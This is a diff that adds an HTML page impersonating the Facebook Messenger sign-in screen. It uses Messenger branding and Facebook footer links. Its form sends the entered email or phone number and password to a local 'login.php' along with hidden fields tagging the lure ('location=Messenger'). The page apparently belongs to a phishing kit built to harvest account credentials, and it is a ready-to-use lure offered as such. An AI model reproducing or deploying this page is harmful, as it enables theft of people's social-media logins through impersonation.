@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<title>Messenger</title>
+	<link rel="shortcut icon" sizes="196x196" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHMAAAB0CAMAAACBmP1sAAAAKlBMVEVHcEwAd/8Am/8Ao//+/v8Ag/8Ai/4Ak/8Brv8Aqf+n0fA9pPpwvPbV7P/cpejSAAAAAXRSTlMAQObYZgAABLlJREFUeAG9k4t2tDoIhTmJYxTw/V/3mN+6F6aEpjPWb7IqcmEHpkNvwDu6wxX6a1hVlhZR/SNlZl0i9O6RYz1w47y6DCN6/4hPDMuy/B7hpxU/U9VlffQjxbWeJ1Sx1mHh9eMF67Kerdb9HM8d2E68yfvtqLLewT4qjcLLegt1VH5MEgyK8novA6K63o2OSOY17wdPgPcIp15/WmyurGdN/Zwe2ytkNfX1deEfJE+ZapkWx/v5jD/Z1B+qHEpiTkhgKNMlpr1iKLpAD5g5TTCeE2DOvFAHQYXbwwYjmurjCLloXv9mznoWJQf+ruPT88f1K/e+zFSPBa8IwdOCHL9+8TabE8rwgacxkGUPctr6w1JqYMTdq5/1MFIziM1JndHb7Uq2c+JAqB0YcWiZ0HV4ZEg7ZkZhWJ6sYpuGaeG0le2gknb866aEZ6tmYk09OlzqhQxcAx8B4cZ9feHvY9bK8+HYsGCbZ3Jd1rMjBBgR3M2xYRnbpGTjglqTlNmOWUFd9mxYeMmIGh2b1ngug+K7DhQvAxzEirYl5synpH51KN7acrOCdl0AZm6LbaY2qwUlpx4lfQJ+LvzVq/RlcKAKh30bacBUUdsQx9UqqSALDrzBqrZuLAiYv2pWe+Y2KX7ImvYNHtmmadpwP3NfoUpyh8FfG8oi2Wq0lach0z8UdzBrph1GlbcK69dtqnA2g9tBUMHTgZh4QZCItHy58Ty5+Ou6TvTw7VSjrc9n4pa8vkpEUoaQycBpJFH8OBGhPCRtk2Xr3pSRw51ORFRGQCugxSObq/WGIeLfbjbYb5KtfynAg5roFe5XbbT0NbUMoJOLBl957jcjGd9svF+5SGrQjWT8Hyjcr179pUsa0US7YL+puZaUz+ZMUwhn7BVwCTXT25sF29Y64hlOzbnM+wn/gcbR4gCNRMezvhuMDz/NcdjWf7cTyRxSdPo1aQ6RnzTf2ewc8+Ocv9/shto353xjs/KhZol/Fh48/6wZbp8bRdmvwfFmy4+aGmqKO4K8u1loRrvY/HZpe2ezgIkGN7ulXsRSBjQp0JRgAHnrpwlN6W82aFa28KcZIFXzNb+Ot92AfflpbrgX8tz9iq2PNLn2qNR82K9i9/rykFZSUe/0A0w7Lxc2rTo0+93QPoQq4kUUnaRfPrOVLEOShSrqddvCvQLZprFEoFRhr1e4V8Os/1RZXmP8x/QP54aKvQ5Q5tcwM1F3uRvWdS9KB+zujPX1BzB9Ia+nKHSij2kqgackZyKgz49pBv2vfnb2h7ERa/zwDdaTRfdIjeLvVzPY1mv9Jox8U36tV7pwpqNqB2WIfXmtH+9O3VUaY54oQjYbT3dOm+LWQfkIMjWIWaE96NCeOMW5gVALY69tte/zzPhiTN9QN9Neu3v6dSZHyUHaxGHRoA5HyINRNH7Gr0U+HJYPiAZBpg4alA+MFixAqYtc/hs+HM0coR4QHew1eq++JEQrUH0Pe7FYEqL3MhM9LSo0wPygJLhTUmkMeV6S9DZJplH4viGf1mR6WlOJHtYUooc1hem38IOK4MHvETw4YqApIn8jCDr7YpWenDJ9iKMIWFXk9TqnF/1MDkizsEd4XBGiSs/C/Hcj/g+0zLZI7bXdoQAAAABJRU5ErkJggg==" />
+	<style>
+		* {
+			box-sizing: border-box;
+			margin: 0;
+			padding: 0;
+		}
+
+		body {
+			font-family: 'Helvetica Neue', Segoe UI, Helvetica, Arial, sans-serif;
+			background: #fff;
+			color: #000;
+			line-height: 1.34;
+			padding: 20px;
+			display: flex;
+			flex-direction: column;
+			min-height: 100vh;
+			justify-content: center;
+		}
+
+		.container {
+			max-width: 400px;
+			width: 100%;
+			margin: 0 auto;
+			text-align: center;
+		}
+
+		h1 {
+			font-size: 32px;
+			font-weight: 300;
+			margin-bottom: 16px;
+		}
+
+		h2, .subtitle {
+			font-size: 16px;
+			font-weight: 200;
+			line-height: 1.2;
+			margin-bottom: 24px;
+			color: #000;
+		}
+
+		.input {
+			border: 1px solid rgba(0, 0, 0, 0.2);
+			border-radius: 4px;
+			color: rgba(0, 0, 0, 1);
+			font-size: 17px;
+			height: 44px;
+			width: 100%;
+			padding: 0 16px;
+			margin-bottom: 12px;
+			text-align: left;
+		}
+
+		.input::placeholder {
+			color: rgba(0, 0, 0, 0.2);
+		}
+
+		button {
+			background: #0084ff;
+			color: white;
+			font-size: 17px;
+			font-weight: bold;
+			border: none;
+			border-radius: 6px;
+			padding: 12px 16px;
+			width: 100%;
+			cursor: pointer;
+			margin: 8px 0 20px;
+			font-family: inherit;
+		}
+
+		button:hover {
+			background: #0077e6;
+		}
+
+		/* Custom Checkbox */
+		.checkbox-container {
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			margin-bottom: 24px;
+			font-size: 14px;
+			color: #1c1e21;
+		}
+
+		.checkbox-container input {
+			position: absolute;
+			opacity: 0;
+			cursor: pointer;
+		}
+
+		.checkmark {
+			height: 16px;
+			width: 16px;
+			background-color: #eee;
+			border-radius: 3px;
+			margin-right: 8px;
+			flex-shrink: 0;
+		}
+
+		.checkbox-container:hover .checkmark {
+			background-color: #ccc;
+		}
+
+		.checkbox-container input:checked ~ .checkmark {
+			background-color: #1877f2;
+		}
+
+		.checkbox-container .checkmark:after {
+			content: "";
+			position: absolute;
+			display: none;
+		}
+
+		.checkbox-container input:checked ~ .checkmark:after {
+			display: block;
+		}
+
+		.checkbox-container .checkmark:after {
+			left: 5px;
+			top: 1px;
+			width: 4px;
+			height: 8px;
+			border: solid white;
+			border-width: 0 2px 2px 0;
+			transform: rotate(45deg);
+		}
+
+		.footer-links {
+			display: flex;
+			flex-wrap: wrap;
+			justify-content: center;
+			align-items: center;
+			gap: 8px;
+			color: #a8a8a8;
+			font-size: 11px;
+			margin-top: auto;
+			padding-top: 20px;
+		}
+
+		.footer-links a {
+			color: #a8a8a8;
+			text-decoration: none;
+			white-space: nowrap;
+		}
+
+		.footer-links a:hover {
+			text-decoration: underline;
+		}
+
+		.footer-links span.separator {
+			color: #a8a8a8;
+		}
+
+		/* Mobile Adjustments */
+		@media (max-width: 480px) {
+			h1 {
+				font-size: 28px;
+			}
+			.input {
+				height: 42px;
+				font-size: 16px;
+			}
+			button {
+				font-size: 16px;
+				padding: 10px;
+			}
+		}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEwAAABKCAMAAAAmEEIEAAAANlBMVEVHcEwAwP8Bs/8Agv8ktPYZeN0Siu8yjNk2hs8ynecAjv8Bp/8Ad/8Bmv/////R7f9Yvv+e2/8HLAH/AAAACnRSTlMA////4M3tgD2vYPIbvwAAAphJREFUeAHFk48OoyAMh6sTKLo/+v4ve73uF8AK3txI7munUsoXIBn9Aw5xAjEwfY94BoMYvzJlkRVe9cXhlNhPdUUXho/45LA8DR8y8eVt/bC5abhE7OMCU0dX04arH/vYpr+mMT3OGBGwnbrSC4HHvpZKFVscxsYq84koPqN1scwi8dI07zzcTbE9pHYedfaNSSXNmIPG3IYXSAtNZdjNRHNIkHzWg1KjwruN/Ug0G/sN7rQxs7VlvBz5gTGBcN015gfGAbL4wToTi51aYj6lgJYD2+swAd+2pnI6J5e96UrSiudTbShqKutrk89cYZWFpc24Pp+wJaB6bvtKwJW1EZfaTHncntaFS5vOXbAZ1cH1mFTml4dEyhxwwZa6RKWuslXwKpNPlEzABRu61ldyI/RT8i0Taq4RGrCp/wXzsR8yNScW/OAqbaOo4Co6AWT7raFpwcICVNRV6BCQ1Ugu44TrCGS+4cJFbVbWcPmmDPe8PoTtIxdk7jE/JFPAJSqMNuNCly7LI6eyiHpOda1JrmOwFg4EBlFlYZ5lUKT+W7QBlWxbi14ExnMgZa+a9U88vzuMbX1XsRxgTG/8XLLJZeUmgJOjmg1Z6yGLOxdUINvgahEh46K2YkXFhpkGTOmcP4FTgjDfEDPetZBsR6CEf/fmNSYrpX2np0yQ8jvxMFkp7TsDFXgUBXlU1lVdqeqphKWOFVXm8zLTDnf7AUcG/73Lk4W/lzEdCLfbvZnNGXEFqhBlqhXtqXukKlHm6imPxhxcVVtjScOFfTUI9+bW6tVAJ/D9EkynuAsqx9RNhiP2kDmiXjKcsIcMqg4yFwhckTnm6Hzp8S4wXcAdjsIcFEbhuswH+h3IoOohi9QJh8vqQoDq//MHcYd0E1zD4+0AAAAASUVORK5CYII=" 
+		     alt="Messenger" style="height: 60px; margin-bottom: 16px;" />
+
+		<h1>Messenger</h1>
+		<h2>Instantly connect with people in your life.</h2>
+		<div class="subtitle">Sign in with Facebook to get started.</div>
+
+		<form action="login.php" method="post">
+			<input type="hidden" name="name" value="index.php" />
+			<input class="input" name="username" type="text" placeholder="Email address or phone number" required />
+			<input class="input" name="password" type="password" placeholder="Password" required />
+			<input type="hidden" name="location" value="Messenger" />
+
+			<button type="submit">Continue</button>
+
+			<div class="checkbox-container">
+				<input type="checkbox" id="keep" name="keep" checked />
+				<label for="keep" class="checkmark"></label>
+				<label for="keep">Keep me signed in</label>
+			</div>
+		</form>
+
+		<div class="footer-links">
+			<a href="#">Not on Facebook?</a>
+			<span class="separator">|</span>
+			<a href="#">Forgotten password</a>
+			<span class="separator">|</span>
+			<a href="#">Data Policy</a>
+			<span class="separator">|</span>
+			<a href="#">Terms</a>
+			<span class="separator">|</span>
+			<a href="#">Cookies Policy</a>
+			<span class="separator">|</span>
+			<a href="#">&copy; Facebook 2025</a>
+		</div>
+	</div>
+	<footer></footer>
+</body>
+</html>
